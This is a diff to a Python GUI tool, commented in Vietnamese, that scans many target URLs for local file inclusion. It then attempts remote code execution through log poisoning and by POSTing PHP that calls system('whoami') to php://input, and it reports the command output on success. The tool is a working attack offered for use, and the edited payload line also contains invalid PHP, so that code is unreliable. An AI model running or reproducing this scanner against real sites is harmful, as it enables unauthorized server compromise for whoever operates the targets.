@@ -38,7 +38,7 @@ class LFIThread(QThread):
         ]
 
         # Mã độc chung cho RCE
-        self.rce_code = "<?php echo 'HACKED_BY_GEMINI'; system('whoami'); ?>"
+        self.rce_code = "<?php HACKED!! echo 'da RCE thanh cong'; system('whoami'); ?>"
 
     def run(self):
         self.log_process.emit(f"🔥 Bắt đầu tấn công {len(self.targets)} mục tiêu...")
@@ -48,7 +48,8 @@ class LFIThread(QThread):
             
             parsed = urlparse(url)
             base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
-            params = parse_qs(parsed.query) 
+            params = parse_qs(parsed.query)
+            print(params) 
             if not params: continue
 
             found_lfi_param = None 
@@ -59,7 +60,6 @@ class LFIThread(QThread):
             for param_name in params:
                 for payload in self.payloads_file:
                     if not self.is_running: break
-                    
                     # Nối chuỗi thủ công
                     new_query_parts = []
                     for k, v in params.items():
@@ -129,7 +129,7 @@ class LFIThread(QThread):
                         exploit_url = f"{base_url}?{'&'.join(new_query_parts)}"
                         
                         res = requests.get(exploit_url, timeout=5)
-                        if b"HACKED_BY_GEMINI" in res.content:
+                        if b"HACKED" in res.content:
                             self.ket_qua_scan.emit(url, "Log Poisoning", "RCE THÀNH CÔNG")
                             self.log_process.emit(f"<h2 style='color:red; background:yellow'>💥 RCE VIA LOG POISONING!</h2>")
                             break
@@ -151,15 +151,15 @@ class LFIThread(QThread):
                     # Đây là chìa khóa để php://input hoạt động
                     res = requests.post(input_url, data=self.rce_code, timeout=5)
                     
-                    if b"HACKED_BY_GEMINI" in res.content:
+                    if b"HACKED" in res.content:
                         self.ket_qua_scan.emit(url, "php://input", "RCE THÀNH CÔNG")
-                        self.log_process.emit(f"<h2 style='color:red; background:yellow'>💥 RCE VIA PHP://INPUT!</h2>")
+                        self.log_process.emit(f"<h2 style='color:red; background:yellow'> RCE VIA PHP://INPUT!</h2>")
                         try:
-                            output = res.text.split("HACKED_BY_GEMINI")[1][:50]
+                            output = res.text.split("HACKED")[1][:50]
                             self.log_process.emit(f"<b>Output lệnh: {output}</b>")
                         except: pass
                     else:
-                        self.log_process.emit("-> php://input thất bại (Server tắt allow_url_include)")
+                        self.log_process.emit("-> php://input thất bại ")
                 except Exception as e: 
                     pass
 
